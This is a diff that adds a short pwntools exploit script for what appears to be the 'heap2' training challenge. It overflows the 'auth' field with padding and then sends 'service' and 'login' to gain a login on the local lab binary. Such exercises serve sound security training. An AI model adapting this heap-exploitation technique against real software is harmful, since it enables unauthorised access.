@@ -1,0 +1,13 @@
+from pwn import *
+
+p = process("./heap2")
+'''
+p = gdb.debug("./heap2", gdbscript = 
+b *main
+)
+'''
+p.sendlineafter(b"]\n", b"auth " + b"A" * (3 + 8))
+p.sendlineafter(b"]\n", b"service")
+p.sendlineafter(b"]\n", b"login")
+
+p.interactive()
